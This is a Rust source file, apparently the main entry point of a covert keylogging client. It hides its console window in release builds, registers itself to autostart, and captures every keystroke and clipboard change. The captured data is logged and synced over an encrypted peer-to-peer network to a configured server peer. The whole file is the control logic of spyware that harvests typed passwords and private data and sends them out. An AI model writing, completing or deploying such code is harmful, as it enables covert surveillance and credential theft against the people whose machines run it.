#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use futures::future::select_all;
use std::sync::Arc;
use tokio::signal;
use tokio::task::JoinHandle;
use tokio::time::Duration;

mod app_config;
mod core_monitors;
mod errors;
mod event_types;
mod internal_logger;
mod network; // Still used for network::encryption
mod p2p;
mod processing;
mod services;
mod storage;
mod system_utils; // Our new P2P module

use app_config::Settings;
use errors::AppError;
use p2p::{
    data_sender::P2pDataSender,
    swarm_manager::{self as p2p_swarm_manager, SwarmCommand},
};
use tokio::sync::{mpsc, watch}; // Added watch for shutdown

async fn bridge_std_to_tokio<T: Send + 'static>(
    std_rx: std::sync::mpsc::Receiver<T>,
    tokio_tx: tokio::sync::mpsc::Sender<T>,
    channel_name: &'static str,
) {
    // This task will run until std_rx is dropped or tokio_tx encounters an error.
    tokio::task::spawn_blocking(move || {
        for data in std_rx {
            // Iterates until the std::sync::mpsc::Sender is dropped
            if tokio_tx.blocking_send(data).is_err() {
                tracing::error!(
                    "Bridge {}: Tokio channel closed while sending. Bridge task ending.",
                    channel_name
                );
                break; // Exit if the tokio channel receiver is dropped
            }
        }
        // This log indicates the std::sync::mpsc::Sender was dropped, ending the loop.
        tracing::info!(
            "Bridge {}: Standard MPSC channel ({}) closed by sender dropping. Bridge task ending.",
            channel_name,
            channel_name
        );
    })
    .await
    .unwrap_or_else(|join_err| {
        // This means the spawn_blocking task itself panicked.
        tracing::error!("Bridge task for {} panicked: {}", channel_name, join_err);
    });
}

#[tokio::main]
async fn main() -> Result<(), AppError> {
    let settings = match Settings::new() {
        Ok(s) => s,
        Err(e) => {
            eprintln!(
                "FATAL: Client Configuration error: {}. Ensure 'client_settings.toml' exists and is valid.",
                e
            );
            #[cfg(debug_assertions)]
            std::thread::sleep(std::time::Duration::from_secs(5));
            return Err(e);
        }
    };

    if let Err(e) = internal_logger::init_logging(&settings) {
        eprintln!("FATAL: Client Internal logger initialization error: {}", e);
        #[cfg(debug_assertions)]
        std::thread::sleep(std::time::Duration::from_secs(5));
        return Err(e);
    };

    tracing::info!(
        "Client Application starting. Version: {}. App Client ID: {}",
        env!("CARGO_PKG_VERSION"),
        settings.client_id
    );
    tracing::debug!(
        "Client Loaded settings. Target Server Peer ID: '{}'",
        settings.server_peer_id
    );
    tracing::debug!(
        "Client Bootstrap addresses: {:?}",
        settings.bootstrap_addresses
    );

    if let Err(e) = system_utils::startup::setup_autostart(&settings) {
        tracing::warn!(
            "Client: Failed to setup autostart: {}. Continuing execution...",
            e
        );
    }

    // --- Shutdown signaling ---
    let (shutdown_tx, shutdown_rx_sync_manager) = watch::channel(false);
    let shutdown_rx_event_processor = shutdown_tx.subscribe();
    let shutdown_rx_log_store = shutdown_tx.subscribe();
    let shutdown_rx_swarm_manager = shutdown_tx.subscribe(); // For P2P Swarm Manager

    // --- Raw event channels (from OS monitors to Tokio domain) ---
    let (raw_kb_std_tx, raw_kb_std_rx) =
        std::sync::mpsc::channel::<core_monitors::keyboard_capture::RawKeyboardData>();
    let (raw_clip_std_tx, raw_clip_std_rx) =
        std::sync::mpsc::channel::<core_monitors::clipboard_capture::RawClipboardData>();

    let (tokio_kb_tx, tokio_kb_rx) = mpsc::channel(128);
    let (tokio_clip_tx, tokio_clip_rx) = mpsc::channel(64);

    // --- Start OS monitors (in separate threads) ---
    let kbd_monitor_thread_handle =
        core_monitors::keyboard_capture::start_keyboard_monitoring(raw_kb_std_tx)?;
    tracing::info!("Client: Keyboard monitor thread started.");

    let clip_monitor_thread_handle = core_monitors::clipboard_capture::start_clipboard_monitoring(
        raw_clip_std_tx,
        Arc::clone(&settings),
    )?;
    tracing::info!("Client: Clipboard monitor thread started.");

    // --- Start bridge tasks (std::mpsc to tokio::mpsc) ---
    let kb_bridge_task = tokio::spawn(bridge_std_to_tokio(raw_kb_std_rx, tokio_kb_tx, "Keyboard"));
    let clip_bridge_task = tokio::spawn(bridge_std_to_tokio(
        raw_clip_std_rx,
        tokio_clip_tx,
        "Clipboard",
    ));
    tracing::info!("Client: Keyboard and Clipboard bridge tasks started.");

    // --- Start LogStore actor ---
    let (log_store_handle, log_store_task) = storage::log_store::create_log_store_handle_and_task(
        Arc::clone(&settings),
        128,
        shutdown_rx_log_store,
    );
    tracing::info!("Client: LogStore actor task started.");

    // --- Start EventProcessor task ---
    let event_processor_task = tokio::spawn(processing::event_processor::run_event_processor(
        Arc::clone(&settings),
        tokio_kb_rx,
        tokio_clip_rx,
        log_store_handle.clone(),
        shutdown_rx_event_processor,
    ));
    tracing::info!("Client: Event processor task started.");

    // --- Start P2P Swarm Manager ---
    let (swarm_command_tx_for_sender, swarm_command_rx_for_manager) =
        mpsc::channel::<SwarmCommand>(32);

    let swarm_manager_settings_ref = Arc::clone(&settings);
    // Pass the specific shutdown receiver for the swarm manager
    let swarm_manager_task = tokio::spawn(async move {
        if let Err(e) = p2p_swarm_manager::run_swarm_manager(
            swarm_manager_settings_ref,
            swarm_command_rx_for_manager,
            shutdown_rx_swarm_manager, // Pass its own shutdown receiver
        )
        .await
        {
            tracing::error!("Client: P2P Swarm Manager exited with error: {}", e);
        } else {
            tracing::info!("Client: P2P Swarm Manager exited gracefully.");
        }
        // Explicitly return a compatible type if the JoinHandle is collected into `app_logic_tasks`
        // For now, it's handled separately in select!
    });
    tracing::info!("Client: P2P Swarm Manager task started.");

    // --- Create P2P Data Sender ---
    let p2p_data_sender = P2pDataSender::new(Arc::clone(&settings), swarm_command_tx_for_sender);
    tracing::info!("Client: P2P Data Sender initialized.");

    // --- Start SyncManager task ---
    let sync_manager_task = tokio::spawn(services::sync_manager::run_sync_manager(
        Arc::clone(&settings),
        log_store_handle,
        p2p_data_sender,
        shutdown_rx_sync_manager,
    ));
    tracing::info!("Client: Sync Manager task started.");

    // --- Collect major application logic task handles for graceful shutdown ---
    // Note: swarm_manager_task is handled separately in select! due to its return type
    // being potentially different (it doesn't return Result<(), AppError> directly from its spawn signature)
    let mut app_logic_tasks: Vec<JoinHandle<Result<(), AppError>>> =
        vec![event_processor_task, sync_manager_task, log_store_task];

    // --- Wait for interrupt signal or premature task exit ---
    #[cfg(windows)]
    let mut interrupt_signal_stream =
        signal::windows::ctrl_c().expect("Client: Failed to listen for Ctrl-C");
    #[cfg(unix)]
    let mut interrupt_signal_stream = signal::unix::signal(signal::unix::SignalKind::interrupt())
        .expect("Client: Failed to install SIGINT handler");

    tokio::select! {
        biased;

        _ = interrupt_signal_stream.recv() => {
            tracing::info!("Client: Interrupt signal (Ctrl+C) received, initiating shutdown...");
        }

        res = async {
            if app_logic_tasks.is_empty() {
                std::future::pending::<((), usize)>().await
            } else {
                let (task_result_outer, index, _) = select_all(app_logic_tasks.iter_mut()).await;
                match task_result_outer {
                    Ok(Ok(())) => {
                        tracing::warn!("Client: Core task {} completed prematurely without error.", index);
                        ((), index)
                    }
                    Ok(Err(app_err)) => {
                        tracing::error!("Client: Core task {} exited with AppError: {}", index, app_err);
                        ((), index)
                    }
                    Err(join_err) => {
                        tracing::error!("Client: Core task {} panicked: {}", index, join_err);
                        ((), index)
                    }
                }
            }
        } => {
            let (_result_ignored, _task_index_ignored) = res;
            tracing::info!("Client: An application logic task has exited. Initiating shutdown...");
        }

        swarm_join_result = swarm_manager_task => { // Re-assign to avoid move error if used later
            match swarm_join_result {
                Ok(_) => tracing::info!("Client: P2P Swarm Manager task completed."),
                Err(e) => tracing::error!("Client: P2P Swarm Manager task panicked: {}", e),
            }
            tracing::info!("Client: P2P Swarm Manager task has exited. Initiating shutdown...");
        }
    }

    // --- Initiate graceful shutdown ---
    tracing::info!("Client: Sending shutdown signal to all long-running tasks...");
    if shutdown_tx.send(true).is_err() {
        // This signals all subscribers
        tracing::warn!(
            "Client: Failed to send shutdown signal (all receivers dropped). Tasks might have already terminated."
        );
    }

    tracing::info!(
        "Client: Waiting for application logic tasks to complete shutdown (timeout 10s)..."
    );
    for (i, task_handle) in app_logic_tasks.into_iter().enumerate() {
        // Consumes the vec
        match tokio::time::timeout(Duration::from_secs(10), task_handle).await {
            Ok(Ok(Ok(_))) => tracing::debug!(
                "Client: Application task {} completed successfully during shutdown.",
                i
            ),
            Ok(Ok(Err(e))) => tracing::error!(
                "Client: Application task {} completed with error during shutdown: {}",
                i,
                e
            ),
            Ok(Err(e)) => tracing::error!(
                "Client: Application task {} panicked or was cancelled during shutdown: {}",
                i,
                e
            ),
            Err(_) => tracing::warn!("Client: Application task {} timed out during shutdown.", i),
        }
    }

    // The SwarmManager task was already awaited in the select! block if it exited.
    // If shutdown was triggered by Ctrl+C or another app_logic_task, it will get the signal
    // from `shutdown_rx_swarm_manager` and should terminate. We don't need to join it again here.

    tracing::info!("Client: Waiting for bridge tasks to complete (timeout 5s)...");
    // Monitor OS hook threads (these are std::thread, not tokio tasks, harder to join gracefully from async)
    // The bridge tasks will end when their std::mpsc::Receiver ends (i.e., when kbd_monitor_thread_handle/clip_monitor_thread_handle join and their tx drops)
    // For simplicity, we don't explicitly join the OS monitor threads here, but in a real app you might send them a signal to stop their loops.
    // The `bridge_std_to_tokio` tasks will complete when their `std_rx` ends.
    match tokio::time::timeout(Duration::from_secs(5), kb_bridge_task).await {
        Ok(Ok(_)) => tracing::debug!("Client: Keyboard bridge task completed."),
        Ok(Err(e)) => tracing::error!("Client: Keyboard bridge task panicked: {}", e),
        Err(_) => tracing::warn!("Client: Keyboard bridge task timed out during shutdown."),
    }
    match tokio::time::timeout(Duration::from_secs(5), clip_bridge_task).await {
        Ok(Ok(_)) => tracing::debug!("Client: Clipboard bridge task completed."),
        Ok(Err(e)) => tracing::error!("Client: Clipboard bridge task panicked: {}", e),
        Err(_) => tracing::warn!("Client: Clipboard bridge task timed out during shutdown."),
    }

    // The OS monitor threads (`kbd_monitor_thread_handle`, `clip_monitor_thread_handle`)
    // are detached. For a truly clean shutdown, they would need their own mechanism
    // to be signaled to stop their message loops (e.g., via PostThreadMessage on Windows or another channel).
    // When their loops end, their `raw_kb_std_tx`/`raw_clip_std_tx` would be dropped, causing the
    // `bridge_std_to_tokio` tasks to terminate naturally.
    // For now, they will exit when the main process exits.
    tracing::debug!(
        "Client: Keyboard monitor thread handle: {:?}",
        kbd_monitor_thread_handle.thread().id()
    );
    tracing::debug!(
        "Client: Clipboard monitor thread handle: {:?}",
        clip_monitor_thread_handle.thread().id()
    );

    tracing::info!("Client: Application shutdown sequence complete.");
    Ok(())
}
